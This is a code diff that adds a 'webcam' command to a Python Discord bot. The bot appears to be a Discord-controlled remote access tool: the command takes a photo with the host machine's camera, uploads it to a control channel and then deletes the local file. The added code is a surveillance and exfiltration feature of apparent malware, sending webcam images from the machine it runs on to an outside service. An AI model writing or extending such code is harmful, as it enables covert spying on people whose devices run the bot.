@@ -210,6 +210,33 @@ async def blacklist(ctx: SlashContext, add: bool, name: str):
     else:
         output = functions.remove_blacklist(name)
     await ctx.send(output)
+#webcam command
+@slash_command(
+    name="webcam",
+    description="take webcam photo",
+)
+async def webcam(ctx: SlashContext):
+    # load all channel ids
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("webcam can only be executed in main.")
+        return
+    output = 0
+    output = functions.webcam()
+    if not (output == 0):
+        await ctx.send(output)
+    # send photo
+    await ctx.send(file=File(f'{os.getcwd()}/web.png'))
+    #remove photo
+    import time
+    time.sleep(5)
+    os.remove(f'{os.getcwd()}/web.png')
 #-----------------------------------------------------------------------------------------------------------------------------------
 # start everything
 #-----------------------------------------------------------------------------------------------------------------------------------
